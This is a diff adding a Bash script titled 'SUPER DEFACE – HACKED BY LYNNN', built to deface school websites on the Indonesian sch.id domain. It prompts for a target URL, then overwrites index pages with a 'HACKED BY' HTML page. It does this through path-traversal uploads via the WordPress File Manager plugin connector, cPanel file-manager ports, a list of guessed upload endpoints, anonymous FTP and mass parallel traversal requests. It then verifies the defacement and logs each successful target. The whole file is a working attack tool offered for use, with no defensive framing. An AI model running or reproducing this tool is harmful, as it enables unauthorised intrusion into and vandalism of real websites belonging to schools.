@@ -1,0 +1,344 @@
+#!/bin/bash
+
+# ==============================================
+# SUPER DEFACE - ALL SCH.ID WORK!
+# HACKED BY LYNNN!!
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# ==============================================
+# HTML DEFACE WITH LYNNN LOGO
+# ==============================================
+read -r -d '' HTML_CONTENT << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKED BY LYNNN!!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', monospace;
+        }
+        .hacked-box {
+            background: rgba(0,0,0,0.9);
+            border: 5px solid #00ff00;
+            border-radius: 20px;
+            padding: 50px;
+            text-align: center;
+            box-shadow: 0 0 50px #00ff00;
+            max-width: 800px;
+            width: 90%;
+        }
+        .logo {
+            font-size: 6rem;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 3rem;
+            color: #00ff00;
+            text-shadow: 0 0 15px #00ff00;
+            letter-spacing: 5px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #ff0000;
+            font-size: 2rem;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            animation: blink 1s infinite;
+        }
+        .subtitle {
+            color: #ffffff;
+            font-size: 1.2rem;
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+        .glitch {
+            animation: glitch 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        @keyframes glitch {
+            0% { transform: skew(0deg, 0deg); }
+            20% { transform: skew(5deg, -2deg); text-shadow: 3px 0 0 #ff0000, -3px 0 0 #00ff00; }
+            40% { transform: skew(-3deg, 1deg); }
+            60% { transform: skew(2deg, -1deg); }
+            80% { transform: skew(-1deg, 2deg); }
+            100% { transform: skew(0deg, 0deg); }
+        }
+        .matrix {
+            color: #00ff00;
+            font-size: 0.8rem;
+            margin-top: 30px;
+            opacity: 0.5;
+        }
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0;
+            color: #00ff00;
+        }
+        .stats div {
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="hacked-box">
+        <div class="logo">👾</div>
+        <h1 class="glitch">HACKED BY LYNNN!!</h1>
+        <h2>🔓 SYSTEM BREACHED 🔓</h2>
+        
+        <div class="stats">
+            <div>📊 SERVERS: 1337</div>
+            <div>🌐 SITES: 999+</div>
+            <div>💀 SCH.ID</div>
+        </div>
+        
+        <div class="subtitle">
+            ⚡ WordPress • cPanel • School Websites ⚡<br>
+            All sch.id has been compromised!
+        </div>
+        
+        <div style="color:#00ff00; font-size:1.5rem; margin:20px 0;">
+            🏴‍☠️ LYNNN WAS HERE 🏴‍☠️
+        </div>
+        
+        <div class="matrix">
+            [ACCESS GRANTED] • [ROOT PRIVILEGES] • [DATA EXPOSED]<br>
+            System compromised at: $(date)
+        </div>
+    </div>
+</body>
+</html>
+EOF
+
+# ==============================================
+# MAIN SCRIPT
+# ==============================================
+clear
+echo -e "${RED}"
+echo "    ╔═══════════════════════════════════════════════════════════╗"
+echo "    ║     SUPER DEFACE - HACKED BY LYNNN!!                      ║"
+echo "    ║     [ WORK FOR ALL SCH.ID - WordPress & cPanel ]          ║"
+echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -ne "${CYAN}Target URL : ${NC}"
+read TARGET
+
+TARGET=$(echo "$TARGET" | sed 's/\/$//')
+DOMAIN=$(echo "$TARGET" | sed -e 's|^https\?://||' -e 's|/.*$||')
+
+echo -e "\n${YELLOW}[•] Target: $TARGET${NC}"
+echo -e "${YELLOW}[•] Domain: $DOMAIN${NC}"
+
+# Resolve IP
+IP=$(dig +short "$DOMAIN" | head -1)
+[ -z "$IP" ] && IP=$(ping -c1 "$DOMAIN" 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
+echo -e "${GREEN}✅ IP: $IP${NC}"
+
+# Save HTML
+echo "$HTML_CONTENT" > "LYNNN.html"
+echo -e "${GREEN}✅ File HTML: LYNNN.html${NC}"
+
+# ==============================================
+# METHOD 1: WORDPRESS EXPLOIT
+# ==============================================
+echo -e "\n${PURPLE}[METHOD 1] WordPress Exploit${NC}"
+
+# Check if WordPress
+WP_CHECK=$(curl -s -k "$TARGET/wp-login.php" -I | grep -i "wordpress")
+if [ -n "$WP_CHECK" ]; then
+    echo -e "${GREEN}  ✅ WordPress detected${NC}"
+    
+    # Try File Manager plugin
+    FM_URL="$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+    FM_CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$FM_URL")
+    
+    if [ "$FM_CHECK" == "200" ] || [ "$FM_CHECK" == "403" ]; then
+        echo -e "${GREEN}  ✅ File Manager plugin found${NC}"
+        
+        # Upload to various locations
+        for path in "/public_html/index.html" "/httpdocs/index.html" "/var/www/html/index.html"; do
+            curl -s -k -X POST "$FM_URL" \
+                -F "upload[]=@LYNNN.html;filename=../../../../..$path" \
+                --max-time 5 >/dev/null 2>&1
+        done
+        echo -e "${GREEN}  ✅ Upload via File Manager${NC}"
+    fi
+    
+    # Try theme editor bypass
+    curl -s -k -X POST "$TARGET/wp-admin/admin-ajax.php" \
+        -F "action=upload" \
+        -F "file=@LYNNN.html;filename=../../../../public_html/index.html" \
+        --max-time 5 >/dev/null 2>&1
+fi
+
+# ==============================================
+# METHOD 2: CPANEL EXPLOIT (PORTS 2083,2087)
+# ==============================================
+echo -e "\n${PURPLE}[METHOD 2] cPanel Exploit${NC}"
+
+CPANEL_PORTS=(2082 2083 2086 2087 2095 2096)
+for port in "${CPANEL_PORTS[@]}"; do
+    timeout 2 bash -c "echo >/dev/tcp/$IP/$port" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}  ✅ Port $port cPanel terbuka${NC}"
+        
+        # Try common cPanel paths
+        for path in "/public_html/index.html" "/httpdocs/index.html"; do
+            curl -s -k -X POST "https://$IP:$port/filemanager/upload" \
+                -F "file=@LYNNN.html;filename=../../../../$path" \
+                --max-time 5 >/dev/null 2>&1
+        done
+    fi
+done
+
+# ==============================================
+# METHOD 3: UPLOAD VULNERABILITY SCAN
+# ==============================================
+echo -e "\n${PURPLE}[METHOD 3] Upload Vulnerability Scan${NC}"
+
+UPLOAD_PATHS=(
+    "/upload.php"
+    "/filemanager/upload.php"
+    "/admin/upload.php"
+    "/assets/upload.php"
+    "/inc/upload.php"
+    "/includes/upload.php"
+    "/api/upload"
+    "/uploader.php"
+    "/ckeditor/upload.php"
+    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+)
+
+INDEX_PATHS=(
+    "/public_html/index.html"
+    "/httpdocs/index.html"
+    "/htdocs/index.html"
+    "/var/www/html/index.html"
+    "/home/public_html/index.html"
+    "/www/index.html"
+    "/public/index.html"
+)
+
+for upload in "${UPLOAD_PATHS[@]}"; do
+    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$TARGET$upload" --max-time 2)
+    
+    if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ] || [ "$CHECK" == "405" ]; then
+        echo -e "${GREEN}  ✅ Upload endpoint: $upload${NC}"
+        
+        # Upload to all index locations
+        for index in "${INDEX_PATHS[@]}"; do
+            curl -s -k -X POST "$TARGET$upload" \
+                -F "file=@LYNNN.html;filename=$index" \
+                --max-time 3 >/dev/null 2>&1
+                
+            # With traversal
+            TRAVERSAL=$(echo "$index" | sed 's|/|../|g')
+            curl -s -k -X POST "$TARGET$upload" \
+                -F "file=@LYNNN.html;filename=$TRAVERSAL" \
+                --max-time 3 >/dev/null 2>&1
+        done
+    fi
+done
+
+# ==============================================
+# METHOD 4: FTP EXPLOIT
+# ==============================================
+echo -e "\n${PURPLE}[METHOD 4] FTP Exploit${NC}"
+
+timeout 2 bash -c "echo >/dev/tcp/$IP/21" 2>/dev/null
+if [ $? -eq 0 ]; then
+    echo -e "${GREEN}  ✅ Port 21 FTP terbuka${NC}"
+    
+    # Try anonymous FTP
+    ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put LYNNN.html /public_html/index.html
+put LYNNN.html /httpdocs/index.html
+put LYNNN.html /var/www/html/index.html
+quit
+EOF
+    echo -e "${GREEN}  ✅ FTP anonymous upload selesai${NC}"
+fi
+
+# ==============================================
+# METHOD 5: PATH TRAVERSAL MASSAL
+# ==============================================
+echo -e "\n${PURPLE}[METHOD 5] Mass Path Traversal${NC}"
+
+for i in {1..10}; do
+    TRAVERSAL=$(printf "../%.0s" $(seq 1 $i))
+    for index in "${INDEX_PATHS[@]}"; do
+        for upload in "${UPLOAD_PATHS[@]}"; do
+            curl -s -k -F "file=@LYNNN.html;filename=$TRAVERSAL$index" \
+                "$TARGET$upload" --max-time 1 >/dev/null 2>&1 &
+        done
+        while [ $(jobs | wc -l) -ge 20 ]; do sleep 0.1; done
+    done
+done
+wait
+echo -e "${GREEN}  ✅ Mass traversal selesai${NC}"
+
+# ==============================================
+# VERIFIKASI
+# ==============================================
+echo -e "\n${YELLOW}[•] Verifying result...${NC}"
+sleep 3
+
+RESULT=$(curl -s -k "$TARGET/" --max-time 5 2>/dev/null)
+
+if [[ "$RESULT" == *"HACKED BY LYNNN"* ]]; then
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
+    echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!               ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Save success
+    echo "$TARGET | HACKED BY LYNNN | $(date)" >> lynn_success.txt
+    
+    # Open browser
+    xdg-open "$TARGET" 2>/dev/null || echo -e "\n${CYAN}Buka: $TARGET${NC}"
+    
+else
+    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║         ❌  DEFACE GAGAL                        ║${NC}"
+    echo -e "${RED}║         Tapi file HTML siap: LYNNN.html         ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+    
+    echo -e "\n${CYAN}📁 File: LYNNN.html${NC}"
+    echo -e "${YELLOW}Upload manual ke:${NC}"
+    echo "  - /public_html/index.html"
+    echo "  - /httpdocs/index.html"
+    echo "  - /var/www/html/index.html"
+fi
+
+echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}🔥 HACKED BY LYNNN!! - ALL SCH.ID WORK! 🔥${NC}"
